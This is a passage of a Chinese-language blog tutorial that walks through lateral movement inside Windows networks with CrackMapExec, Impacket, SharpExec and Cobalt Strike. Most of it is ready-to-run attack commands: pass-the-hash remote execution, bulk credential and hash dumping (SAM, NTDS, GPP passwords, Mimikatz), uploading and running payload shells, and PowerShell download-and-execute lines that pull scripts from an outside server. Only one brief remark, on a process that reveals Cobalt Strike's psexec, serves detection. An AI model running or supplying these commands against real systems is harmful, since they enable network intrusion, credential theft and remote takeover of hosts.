<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 host.txt  --list \\Windows\\Temp\\</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134847632.png" alt="image-20200827134847632"></p>
<p>​        下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 192.168.3.144  --download \\Windows\\Temp\\</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827135107554.png" alt="image-20200827135107554"></p>
<p><strong>批量执行命令</strong></p>
<p>​        通过smbexec批量执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 host.txt --execm smbexec -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194639115.png" alt="image-20200826194639115"></p>
<p>​        通过smbexec远程加载powershell上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 host.txt --execm smbexec -x &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxxx:8011&#x2F;a111&#39;))\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827114124144.png" alt="image-20200827114124144"></p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827114139359.png" alt="image-20200827114139359"></p>
<p>​        通过wmi批量执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxxx -t 1 host.txt --execm wmi -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194904286.png" alt="image-20200826194904286"></p>
<p>​        通过atexec批量hash传递执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xxx -t 1 192.168.3.11 --execm atexec -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826202039799.png" alt="image-20200826202039799"></p>
<p><strong>批量抓密码</strong></p>
<p>​        使用wmi加载远程powershell脚本批量抓密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xx -t 1 host.txt --execm wmi -X &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;111.229.70.13:801&#x2F;Invoke-Mimidogz.ps1&#39;);Invoke-Mimidogz&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826202829550.png" alt="image-20200826202829550"></p>
<p>​        调用Invoke-Mimikatz.ps1批量抓密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H aad3b435b51404eeaad3b435b51404ee:ae4c0d5fb959fda8f4cb1d14a8376af4 -t 1 host.txt --mimikatz</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827093343519.png" alt="image-20200827093343519"></p>
<p><strong>批量dump hash</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxxx:xxxx -t 1 --sam  host.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826203436519.png" alt="image-20200826203436519"></p>
<p><strong>远程导出域控中所有的hash</strong></p>
<p>​        这个过程比较慢，不建议在实际中使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 192.168.3.144 --ntds vss</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827093924405.png" alt="image-20200827093924405"></p>
<p><strong>搜集GPP密码</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 host.txt --gpp-passwords</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827094518023.png" alt="image-20200827094518023"></p>
<p>​        其他的利用方法可以参考<a href="https://mpgn.gitbook.io/crackmapexec/" target="_blank" rel="noopener">官方文档</a></p>
<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><p>​        Impacket是用于处理网络协议的Python类的集合。我们除了可以使用python版本，也可以使用别人打包好的<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">windows版本</a>进行利用。这个打包的稍微旧了一点，不过大部分的功能已经打包好了，还有比较<a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries" target="_blank" rel="noopener">新的打包版本</a>,下面我介绍下它在横向渗透中常用的功能。</p>
<p><strong>atexec</strong></p>
<p>​        通过计划任务执行命令,默认以<strong>system权限</strong>执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827161851281.png" alt="image-20200827161851281"></p>
<p>​        也可以使用PTH的方式执行、</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827162051117.png" alt="image-20200827162051117"></p>
<p><strong>DCOM</strong></p>
<p>​        使用这种方式，默认以<strong>administrator权限</strong>执行命令，也可以获取交互shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe .&#x2F;administrator:xxx@192.168.3.11 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827170845398.png" alt="image-20200827170845398"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827181250651.png" alt="image-20200827181250651"></p>
<p>​        也可以通过hash传递来运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.11 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171222916.png" alt="image-20200827171222916"></p>
<p><strong>SMB</strong></p>
<p>​        通过smbexec可以直接获取交互的shell,shell权限也是<strong>system权限</strong>，但无法执行直接执行cmd命令，因此不适合在shell下进行操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171503784.png" alt="image-20200827171503784"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe -hashes :xxx .&#x2F;administrator@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171909815.png" alt="image-20200827171909815"></p>
<p><strong>psexec</strong></p>
<p>​        使用psexec会在目标系统创建服务,返回权限为<strong>system权限</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxx .&#x2F;administrator@192.168.3.51</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827172249787.png" alt="image-20200827172249787"></p>
<p>​        也可以使用psexec执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827172609121.png" alt="image-20200827172609121"></p>
<p>​        也可以直接利用psexec上传文件并且执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe .&#x2F;administrator:xxx@192.168.3.144 -c C:\Users\jerry\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827173702596.png" alt="image-20200827173702596"></p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827173725431.png" alt="image-20200827173725431"></p>
<p>​        这个过程可能会在命令行下出现卡顿，这个不要紧，当我们把弹过来的shell使用完后退出后即可恢复正常，强行关闭命令行会导致创建的服务不能删除。</p>
<p><strong>WMI</strong></p>
<p>​        使用wmiexec进行横向移动，既可以获取交互shell也可以执行命令,也可以进行PTH</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827174532234.png" alt="image-20200827174532234"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827175007031.png" alt="image-20200827175007031"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827175129269.png" alt="image-20200827175129269"></p>
<p>​        关于impacket常见的横向渗透的方法先介绍这么多，我写个表格对各种横向渗透的方式进行简单的对比</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827181506980.png" alt="image-20200827181506980"></p>
<h3 id="SharpExec"><a href="#SharpExec" class="headerlink" title="SharpExec"></a>SharpExec</h3><p>​        SharpExec是一个C#编写的集合了WMIExec，SMBExec，PSExec等常见横向渗透方法的工具。由于这个工具不是很有名，所以可能免杀稍微好一点（我猜的）。</p>
<p><strong>1、psexec</strong></p>
<p>​        首先生成一个<strong>service类型的shell</strong>，放在本地，使用如下命令将上传本地文件到远程服务器并执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;psexec -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;Admin123456 -d&#x3D;. -f&#x3D;C:\Users\jerry\Desktop\artifact.exe -e&#x3D;c:\artifact.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827204927302.png" alt="image-20200827204927302"></p>
<p>​        执行后会返回system权限的shell</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827204958764.png" alt="image-20200827204958764"></p>
<p>​        当我们执行结束后，将shell退出，再按回车程序会自动将上传的文件删掉。</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827205258375.png" alt="image-20200827205258375"></p>
<p><strong>2、wmi</strong></p>
<p>​        这个工具也集成了使用wmi来进行文件上传并且执行的功能,不过这里我们就生成普通的shell即可，不用生成service类型的shell，但生成的shell与系统版本要对应。执行后可以获取administrator权限的shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;wmi -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;xxx -d&#x3D;. -f&#x3D;C:\Users\jerry\Desktop\artifact.exe -e&#x3D;c:\artifact.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828092336716.png" alt="image-20200828092336716"></p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828092404709.png" alt="image-20200828092404709"></p>
<p><strong>3、wmiexec</strong></p>
<p>​        通过wmiexec可以获取半交互的shell，在shell中除了可以进行常规的命令操作，也可以对文件进行操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;wmiexec -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;xxx -d&#x3D;.</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828094503678.png" alt="image-20200828094503678"></p>
<p>​        通过put命令进行文件上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put C:\Users\jerry\Desktop\artifact.exe artifact.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828094720655.png" alt="image-20200828094720655"></p>
<p>​        也可以进行文件下载操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get artifact.exe C:\Users\jerry\Desktop\test666.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828095837635.png" alt="image-20200828095837635"></p>
<p>​        最后输入exit即可退出shell，这里需要注意，如果我们在shell中运行了CS生成的马，在马没有退出的情况下，可能再使用wmiexec会出现异常，只要退出这个马就好了。</p>
<p><strong>4、smbexec</strong></p>
<p>​        使用smbexec和wmiexec功能上类型，获取的半交互shell是system权限。</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100431041.png" alt="image-20200828100431041"></p>
<p>​        也可以进行文件上传下载等操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put C:\Users\jerry\Desktop\artifact.exe c:\artifact.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100629652.png" alt="image-20200828100629652"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get c:\artifact.exe C:\Users\jerry\Desktop\tes888.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100822447.png" alt="image-20200828100822447"></p>
<p>​        这款工具的功能先介绍这么多，他所集成的横向移动的方式并不多，但是对比impacet和crackmapexec，它主要再文件操作这部分进行了一些优化，<strong>可以很方便的去上传并且执行我们的shell</strong>。</p>
<p>​        更详细的介绍请参考作者<a href="https://blog.redxorblue.com/2019/04/sharpexec-lateral-movement-with-your.html" target="_blank" rel="noopener">博客</a></p>
<h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><p>​        CobaltStrike自身内置了部分横向移动的模块，下面我将带着大家一起学习CobaltStrike内置的横向移动模块的使用。</p>
<p><strong>1、psexec</strong></p>
<p>​        当我们获取目标边界机的管理员权限时，可以通过psexec的方法进行横向移动，具体配置如下：</p>
<p>​        点击target-》对想要横向移动的目标右键选择psexec    </p>
<p>​    <img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828110435271.png" alt="image-20200828110435271"></p>
<p>​            配置好账号密码和session以及listener后选择launch</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828110805427.png" alt="image-20200828110805427"></p>
<p>​        执行后我们可以看到，CobaltStrike生成了一个service类型的shell并且在目标主机执行</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828111216157.png" alt="image-20200828111216157"></p>
<p>​        获取权限后，我们查看目标主机的进程，可以看到CobaltStrike是通过rundll32来执行的</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828111534458.png" alt="image-20200828111534458"></p>
<p>​        因此如果在进程中有以system权限起的没有参数的rundll32进程，则有可能是通过CobaltStrike的psexec功能来进行横向移动。</p>
<p><strong>2、psexec_psh</strong></p>
<p>​            使用psexec_psh方式进行横向移动操作过程和psexec类似</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828113904782.png" alt="image-20200828113904782"></p>
<p>​            获取权限后，我们查看目标主机的进程，可以看到CobaltStrike是通过powershell来执行的</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828114117604.png" alt="image-20200828114117604"></p>
<p>​            根据<a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">这篇博客</a>的介绍，CobaltStrike会创建一个powershell的脚本，该脚本将对内存中运行的嵌入式有效载荷进行base64编码，并将其压缩为单行格式，连接到ADMIN $或C $ share并运行PowerShell命令。</p>
<p><strong>3、SC</strong></p>
<p>​        使用这种方式进行横向移动，CobaltStrike并没有提供这种横向移动的方式，不过我们还是可以通过命令行的方式来进行横向移动。</p>
<p>​        首先生成一个serivce类型的shell,将生成的文件上传的边界服务器。</p>
<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115222147.png" alt="image-20200828115222147"></p>
<p>​        再与目标主机建立ipc连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.144\C$ &quot;xxx&quot; &#x2F;user:&quot;Administrator&quot;</span><br><span class="line">shell net use</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115358559.png" alt="image-20200828115358559"></p>
<p>​        通过文件拷贝命令将生成的services.exe拷贝到目标主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy services.exe \\192.168.3.144\C$\windows\temp</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115522488.png" alt="image-20200828115522488"></p>
